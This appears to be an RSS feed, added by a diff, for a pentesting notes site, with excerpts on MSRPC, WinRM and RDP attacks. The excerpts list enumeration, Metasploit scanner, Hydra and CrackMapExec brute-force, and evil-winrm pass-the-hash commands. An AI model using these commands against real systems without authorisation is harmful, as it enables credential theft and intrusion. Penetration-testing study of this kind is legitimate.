@@ -1,0 +1,33 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Protocol on D0CUM3NTN4T10N</title>
+    <link>https://documentnation.github.io/docs/hdks/windows/protocol/</link>
+    <description>Recent content in Protocol on D0CUM3NTN4T10N</description>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <lastBuildDate>Wed, 17 Jan 2024 11:49:11 +0530</lastBuildDate>
+    <atom:link href="https://documentnation.github.io/docs/hdks/windows/protocol/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>MSRPC (Microsoft Remote Procedure Call) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/protocol/msrpc-pentesting/</link>
+      <pubDate>Thu, 26 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/msrpc-pentesting/</guid>
+      <description>Enumeration link nmap --script msrpc-enum -p 135 &amp;lt;target-ip&amp;gt; # rpcdump for dumping RPC endpoints impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; # Find the Print System Remote Prototol or the Print System Asynchronous Remote Protocol impacket-rpcdump -port 135 &amp;lt;target-ip&amp;gt; | grep -E &amp;#39;MS-RPRN|MS-PAR&amp;#39; If we found MS-RPRN or MS-PAR, we might be able to exploit with PrintNightmare.&#xA;Metasploit link msfconsole msf&amp;gt; use auxiliary/scanner/dcerpc/endpoint_mapper msf&amp;gt; use auxiliary/scanner/dcerpc/hidden msf&amp;gt; use auxiliary/scanner/dcerpc/management msf&amp;gt; use auxiliary/scanner/dcerpc/tcp_dcerpc_auditor Investigation linkrpcinfo reports RPC information.</description>
+    </item>
+    <item>
+      <title>WinRM (Windows Remote Management) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/</link>
+      <pubDate>Sun, 22 Oct 2023 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/winrm-pentesting/</guid>
+      <description>Enumeration linkBrute Force Credentials link # CrackMapExec poetry run crackmapexec winrm &amp;lt;target-ip&amp;gt; -d DomainName -u usernames.txt -p passwords.txt # Metasploit msfconsole msf &amp;gt; use auxiliary/scanner/winrm/winrm_login Evil-WinRM linkEvil-WinRM is a Windows Remote Management shell for pentesting.&#xA;Below are list of commands for each situation.&#xA;Connect link evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password # -P: Specifify port evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -p password # Pass The Hash (-H) evil-winrm -i &amp;lt;target-ip&amp;gt; -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc # PowerShell Local Path (-s) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -s /opt/scripts # SSL enabled (-S) evil-winrm -i &amp;lt;target-ip&amp;gt; -u username -p password -S If you have private key and public key, you can use them for authentication.</description>
+    </item>
+    <item>
+      <title>RDP (Remote Desktop Protocol) Pentesting</title>
+      <link>https://documentnation.github.io/docs/hdks/windows/protocol/rdp-pentesting/</link>
+      <pubDate>Mon, 26 Dec 2022 00:00:00 +0000</pubDate>
+      <guid>https://documentnation.github.io/docs/hdks/windows/protocol/rdp-pentesting/</guid>
+      <description>Enumeration link nmap --script rdp-enum-encryption -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp-ntlm-info -p 3389 &amp;lt;target-ip&amp;gt; nmap --script rdp* -p 3389 &amp;lt;target-ip&amp;gt; Brute Force Credentials link hydra -l username -P passwords.txt &amp;lt;target-ip&amp;gt; rdp hydra -L usernames.txt -p password &amp;lt;target-ip&amp;gt; rdp Connect linkRemmina linkRemmina is a remote desktop client for POSIX-based computer operating systems.&#xA;remmina # -c: Connect given URI or file remmina -c rdp://username@vulnerable.com remmina -c rdp://domain\\username@vulnerable.com remmina -c rdp://username:password@vulnerable.com # --------------------------------------------------------------------------------- # Settings # Keyboard mapping 1.</description>
+    </item>
+  </channel>
+</rss>
